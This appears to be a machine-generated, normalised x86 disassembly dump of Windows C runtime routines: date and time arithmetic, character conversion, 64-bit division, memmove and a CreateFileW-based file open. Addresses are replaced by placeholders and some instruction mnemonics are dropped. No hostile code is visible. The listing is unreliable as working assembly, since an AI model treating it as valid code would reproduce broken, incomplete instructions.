cmp [ ebp - 0x38 ] ebx
je r-xdata
inc esi
push esi
call sub_42489d
pop ecx
imul eax eax 0x3c
add [ ebp - 0x1c ] eax
jmp r-xdata
movsx eax [ esi ]
mov [ ebp - 0x24 ] eax
cmp eax ebx
je r-xdata
neg [ ebp - 0x1c ]
mov al [ esi ]
cmp al 0x30
jge r-xdata
mov eax [ edi + 0x4 ]
mov [ eax ] bl
push 0x3
push esi
push 0x40
push [ edi + 0x4 ]
call sub_420dff
add esp 0x10
test eax eax
je r-xdata
cmp al 0x39
jg r-xdata
cmp [ esi ] 0x3a
jne r-xdata
mov esi [ ebp - 0x1c ]
call sub_421c68
mov [ eax ] esi
mov esi [ ebp - 0x24 ]
call sub_421c5c
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
jmp r-xdata
inc esi
inc esi
push esi
call sub_42489d
pop ecx
add [ ebp - 0x1c ] eax
jmp r-xdata
mov al [ esi ]
cmp al 0x30
jge r-xdata
cmp al 0x39
jg r-xdata
inc esi
sub_421752
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
mov eax edi
jne r-xdata
and eax 0x80000003
jns r-xdata
and eax 0x80000003
jns r-xdata
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
mov [ ebp - 0xc ] eax
jne r-xdata
dec eax
or eax 0xfffffffc
inc eax
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov esi [ esi * 4 + rw-data ]
mov esi [ esi * 4 + rw-data ]
jmp r-xdata
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
mov eax esi
shl eax 0x2
mov esi [ eax + rw-data ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ecx
call sub_421bea
pop ecx
test eax eax
je r-xdata
mov [ rw-data ] esi
mov [ rw-data ] ecx
mov [ rw-data ] edi
jmp r-xdata
add esi [ ebp + 0x1c ]
add esi eax
lea esi [ esi + eax - 0x7 ]
jmp r-xdata
mov [ ebp + 0xc ] eax
lea eax [ edi + 0x12b ]
cdq
lea ebx [ edi - 0x1 ]
mov edi 0x190
idiv edi
push 0x64
pop edi
inc esi
push 0x7
mov [ ebp - 0x8 ] eax
mov eax ebx
cdq
idiv edi
mov edx [ ebp - 0x8 ]
mov edi [ ebp + 0x10 ]
sub edx eax
mov ebx edx
lea eax [ edi - 0x1 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx edi
imul edx edx 0x16d
add eax esi
add eax ebx
lea eax [ edx + eax - 0x63db ]
cdq
pop ebx
idiv ebx
mov eax [ ebp + 0x14 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x18 ]
cmp edx [ ebp + 0x18 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0x3e8
add [ rw-data ] eax
jns r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_418855
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
imul ecx ecx 0x3c
add ecx [ ebp + 0x20 ]
imul ecx ecx 0x3c
add ecx [ ebp + 0x24 ]
imul ecx ecx 0x3e8
add ecx [ ebp + 0x28 ]
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x5
jne r-xdata
mov eax 0x5265c00
cmp [ rw-data ] eax
jl r-xdata
add [ rw-data ] 0x5265c00
dec [ rw-data ]
jmp r-xdata
lea eax [ edi + 0x76c ]
cdq
mov ebx 0x190
idiv ebx
test edx edx
je r-xdata
mov eax edi
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
mov [ rw-data ] edi
sub [ rw-data ] eax
inc [ rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
mov eax [ ebp + 0xc ]
mov eax [ eax + rw-data ]
jmp r-xdata
sub esi 0x7
jmp r-xdata
cmp esi eax
jle r-xdata
sub_421949
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp - 0x4 ]
xor esi esi
push eax
mov [ ebp - 0x4 ] esi
call sub_421bb1
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_418855
add esp 0x14
mov edx [ edi + 0x14 ]
push ebx
xor ebx ebx
inc ebx
cmp edx [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
cmp edx [ rw-data ]
je r-xdata
pop esi
leave
retn
cmp edx 0x6b
push 0x3
pop eax
push 0x2
pop ecx
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
jge r-xdata
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
cmp ecx eax
mov edx [ edi + 0x1c ]
jge r-xdata
push esi
push esi
push esi
push esi
push esi
push ecx
push edx
push ebx
push ebx
push 0x2
pop ecx
call sub_421752
mov eax [ ebp - 0xc ]
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x8 ]
push [ edi + 0x14 ]
push ebx
push esi
push 0x2
pop ecx
call sub_421752
add esp 0x48
push 0x4
pop eax
mov ecx ebx
mov [ ebp - 0xc ] 0xa
mov [ ebp - 0x8 ] 0x5
movzx eax [ rw-data ]
push eax
push esi
push esi
push edx
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push edx
push ebx
jmp r-xdata
cmp edx eax
jl r-xdata
cmp edx ecx
jl r-xdata
movzx eax [ rw-data ]
push eax
push esi
push esi
push [ edi + 0x14 ]
push esi
movzx eax [ rw-data ]
push esi
push eax
movzx eax [ rw-data ]
push eax
push [ edi + 0x14 ]
push ebx
jmp r-xdata
movzx eax [ rw-data ]
push ebx
call sub_421752
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
add esp 0x24
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
cmp [ rw-data ] si
jne r-xdata
mov eax ebx
cmp edx ecx
jg r-xdata
xor eax eax
jmp r-xdata
cmp edx eax
jg r-xdata
movzx eax [ rw-data ]
push esi
call sub_421752
add esp 0x24
jmp r-xdata
cmp edx eax
jle r-xdata
pop ebx
cmp edx ecx
jle r-xdata
mov eax [ edi + 0x8 ]
imul eax eax 0x3c
add eax [ edi + 0x4 ]
imul eax eax 0x3c
add eax [ edi ]
imul eax eax 0x3e8
cmp edx ecx
jne r-xdata
cmp edx ecx
jge r-xdata
cmp edx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
xor ecx ecx
cmp eax [ rw-data ]
setge cl
jmp r-xdata
mov eax ecx
jmp r-xdata
sub_421b21
push 0x8
push r--data
call sub_4183f0
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_418435
retn
push 0x6
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_421b67
call sub_42140c
inc [ rw-data ]
sub_421b70
push 0xc
push r--data
call sub_4183f0
push 0x6
call sub_419f99
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
call sub_421949
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_421ba8
mov eax [ ebp - 0x1c ]
call sub_418435
retn
sub_421bb1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_421bea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_421c23
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_421c80
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_421cb4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_415547
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_4119bb
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_422128
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_420097
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_424309
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_421dca
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_421cb4
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0xffffffe0
pop ebp
retn
sub_421df6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_4119bb
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_41897d
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_421e5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_41b3c1
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_4248b3
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_41b3c1
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_411f81
leave
retn
push esi
call sub_41b3c1
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_41b3c1
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_41b3c1
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_41b3c1
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_41b3c1
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_41b3c1
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_41b3c1
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_41b3c1
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_42388c
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_41b3c1
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_41b3c1
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_419079
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_421ff7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_415547
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_422128
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_4119bb
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_422128
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_415547
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_422180
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_422220
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4222a8 ]
jmp [ ecx * 4 + jump_table_422328 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422394 ]
pop esi
pop edi
pop ebp
jmp sub_420571
jmp [ ecx * 4 + jump_table_422530 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_422434 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422530 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_422394 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_422530 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422394 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422394 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_422394 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422530 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422530 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_422530 ]
sub_422585
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
push edi
mov esi eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x34 ] 0xc
mov [ ebp - 0x30 ] ebx
je r-xdata
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x8000
test eax ecx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_418855
add esp 0x14
lea eax [ ebp - 0x20 ]
push eax
call sub_4208c6
pop ecx
test eax eax
je r-xdata
mov eax ecx
and eax 0x3
sub eax ebx
mov edx 0xc0000000
mov edi 0x80000000
je r-xdata
test ecx 0x74000
jne r-xdata
mov [ ebp - 0x8 ] edi
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
sub eax ecx
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
jmp r-xdata
test ecx 0x70000
jne r-xdata
mov [ ebp - 0x8 ] edx
jmp r-xdata
call sub_4119ce
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_4119bb
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_41897d
add esp 0x14
jmp r-xdata
mov [ ebp - 0x14 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
cmp eax ecx
mov edi 0x100
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
mov eax esi
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x14 ] 0x5
jmp r-xdata
cmp eax edx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x10 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test eax 0x1000
je r-xdata
or [ ebp - 0xc ] 0x4000000
or [ ebp - 0x8 ] 0x10000
or [ ebp - 0x10 ] 0x4
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0x8 ] edi
sete al
mov [ ebp - 0x10 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0xc ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0xc ] 0x8000000
jmp r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
call sub_41b6ec
mov [ esi ] eax
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0xc ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileW@IAT ]
push ebx
push [ ebp - 0xc ]
mov [ eax ] 0x1
push [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_4119ce
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_4119bb
mov [ eax ] 0x18
jmp r-xdata
push [ ebp - 0x1c ]
call [ GetFileType@IAT ]
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
call sub_4119bb
mov eax [ eax ]
jmp r-xdata
cmp eax 0x2
